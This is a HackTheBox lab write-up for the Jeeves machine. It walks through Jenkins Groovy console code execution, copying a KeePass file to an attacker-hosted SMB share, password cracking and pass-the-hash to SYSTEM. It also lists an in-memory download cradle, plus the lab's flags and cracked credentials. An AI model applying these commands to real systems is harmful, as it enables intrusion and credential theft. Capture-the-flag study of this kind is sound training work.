# Jeeves - HackTheBox

**IP:** 10.129.228.112
**Difficulty:** Medium
**OS:** Windows
**Kali IP:** 10.10.14.13

## Status
- User: ✓ `e3232272596fb47950d59c4cf1e7066a`
- Root: ✓ `afbc5bd4b615a60648cec41c6ac92530`

## Attack Path

```
Port 50000 (Jetty) → /askjeeves/ (Jenkins 2.87, unauthenticated)
  → Script Console (/askjeeves/script) → Groovy RCE
    → Shell as jeeves\kohsuke
      → CEH.kdbx (KeePass DB) in kohsuke's Documents
        → Cracked with john + rockyou.txt
          → Administrator NTLM hash in "Backup stuff" entry
            → Pass-the-hash with impacket-psexec → SYSTEM
              → Root flag hidden in ADS: hm.txt:root.txt:$DATA
```

---

## Enumeration

### Nmap - Port Scan

```bash
nmap -p- --min-rate 3000 -Pn -oA nmap/JeevesAllPorts 10.129.228.112
nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/JeevesServicesVersions.txt 10.129.228.112
```

| Port  | Service       | Version                        |
|-------|---------------|--------------------------------|
| 80    | HTTP          | Microsoft IIS httpd 10.0       |
| 135   | MSRPC         | Microsoft Windows RPC          |
| 445   | SMB           | Windows 10 Pro 10586 (Workgroup: WORKGROUP) |
| 50000 | HTTP          | Jetty 9.4.z-SNAPSHOT           |

### Port 80 - IIS (Rabbit Hole)

- Serves a fake "Ask Jeeves" search page
- Search form action points to `error.html` (static, not functional)
- `jeeves.PNG` (463KB) shows a fake MSSQL error page (red herring)
- `style.css` references `Ask-Jeeves-whatever-happened-to-32225327-270-301.jpg`
- Directory busting with raft-medium-directories + common.txt found nothing beyond defaults

### Port 445 - SMB (Dead End)

- Guest access appeared enabled in nmap but anonymous sessions were rejected
- `enum4linux -a` failed: "Server doesn't allow session using username '', password ''"
- `smbclient -L` returned nothing

### Port 50000 - Jetty (Attack Vector)

- Root path returns 404 but footer reveals `Jetty 9.4.z-SNAPSHOT`
- Tried CVE-2021-28164 (`%2e` path normalization bypass) - didn't work
- Tried directory traversal (36318.txt backslash technique) - didn't work
- **Directory brute force found nothing** with standard wordlists
- nikto found nothing useful

#### Discovery: `/askjeeves/`

**Key finding:** Tested case-sensitive context paths manually:

```bash
for path in "askjeeves" "AskJeeves" "Jeeves" "jeeves" "ask"; do
  curl -s -o /dev/null -w "Status: %{http_code}\n" "http://10.129.228.112:50000/$path"
done
```

- `/askjeeves` → **302** (redirect to `/askjeeves/`)
- `/askjeeves/` → **200** (Jenkins dashboard!)
- All others → 404

**Lesson:** Standard wordlists didn't contain "askjeeves". The box name was the hint.

---

## Exploitation

### Jenkins 2.87 - Unauthenticated Script Console

Jenkins was **completely unauthenticated** - no login required.

**Accessible endpoints:**
- `/askjeeves/script` - Groovy Script Console (RCE!)
- `/askjeeves/manage` - Jenkins management
- `/askjeeves/credentials` - Stored credentials
- `/askjeeves/systemInfo` - System information

### Remote Code Execution via Script Console

**URL:** `http://10.129.228.112:50000/askjeeves/script`

Groovy code to execute OS commands:

```groovy
def cmd = "cmd.exe /c whoami"
def process = cmd.execute()
println process.text
```

**Results:**
- `whoami` → `jeeves\kohsuke`
- `whoami /all` → SeImpersonatePrivilege **Enabled**
- `dir C:\` → Directories: inetpub, Jenkins, PerfLogs, Program Files, Users, Windows

### User Flag

```groovy
def cmd = "cmd.exe /c type C:\\Users\\kohsuke\\Desktop\\user.txt"
println cmd.execute().text
```

**Flag:** `e3232272596fb47950d59c4cf1e7066a`

---

## Privilege Escalation

### Vector: SeImpersonatePrivilege

User `kohsuke` has **SeImpersonatePrivilege** enabled. This allows impersonating tokens from other processes, enabling escalation to SYSTEM via:

- **JuicyPotato** - Classic, works on Windows 10 build 10586
- **PrintSpoofer** - Newer alternative
- **RoguePotato** - If JuicyPotato is blocked

### KeePass Database → Pass-the-Hash

Found `C:\Users\kohsuke\Documents\CEH.kdbx` (KeePass database).

**Transfer to Kali:**
```bash
# Kali: host SMB share
impacket-smbserver share /path/to/loot -smb2support

# Target: copy file
copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.14.13\share\CEH.kdbx
```

**Crack master password:**
```bash
keepass2john CEH.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Key entries found in KeePass:**

| Entry | User | Value |
|-------|------|-------|
| DC Recovery PW | administrator | S1TjAtJHKsugh9oC4VZl |
| Backup stuff | ? | aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 |
| Keys to the kingdom | bob | lCEUnYPjNfIuPZSzOySA |

**"Backup stuff" contains an NTLM hash** (LM:NT format). Used for pass-the-hash:

```bash
impacket-psexec administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

Result: **SYSTEM shell**

### Root Flag - Alternate Data Stream

`C:\Users\Administrator\Desktop\hm.txt` says "The flag is elsewhere. Look deeper."

Flag hidden in an **Alternate Data Stream (ADS)**:

```cmd
dir /R C:\Users\Administrator\Desktop     # Reveals hidden streams
more < hm.txt:root.txt:$DATA              # Reads the ADS
```

**Flag:** `afbc5bd4b615a60648cec41c6ac92530`

---

## Post-Exploitation

### System Info

- **OS:** Windows 10 Pro 10586 (Workgroup)
- **User:** jeeves\kohsuke (SID: S-1-5-21-2851396806-8246019-2289784878-1001)
- **Groups:** BUILTIN\Users, NT AUTHORITY\SERVICE, NT AUTHORITY\Authenticated Users
- **Privileges:** SeImpersonatePrivilege, SeChangeNotifyPrivilege, SeCreateGlobalPrivilege
- **Mandatory Level:** High

### Filesystem

```
C:\
├── inetpub/       (IIS web root)
├── Jenkins/       (Jenkins installation)
├── PerfLogs/
├── Program Files/
├── Program Files (x86)/
├── Users/
├── Windows/
└── Windows10Upgrade/
```

---

## Lessons Learned

1. **Box name = hint.** "Jeeves" → "askjeeves" was the hidden context path. Standard wordlists won't always have the answer.
2. **Port 80 was a complete rabbit hole.** The fake search page and SQL error image were distractions.
3. **Unauthenticated Jenkins = instant RCE.** Always check `/script` for the Groovy console.
4. **SeImpersonatePrivilege** on a service account is a common Windows privesc path (didn't need it here - had a hash instead).
5. **KeePass databases** in user directories are goldmines. `keepass2john` + rockyou cracks weak master passwords.
6. **Pass-the-hash** - Having the NTLM hash IS having the password. `impacket-psexec` with `-hashes` gives instant SYSTEM.
7. **Alternate Data Streams (ADS)** - Windows can hide data inside files. `dir /R` reveals them, `more < file:stream:$DATA` reads them. Always check when a flag says "look deeper."
8. **Nishang** (`/usr/share/nishang/Shells/`) is pre-installed on Kali - great for PowerShell reverse shells. Remember to append the invoke line to the script.
9. **Download cradle pattern** - Host payload on Kali with `python3 -m http.server`, use `IEX(New-Object Net.WebClient).downloadString()` on target to download + execute in memory.
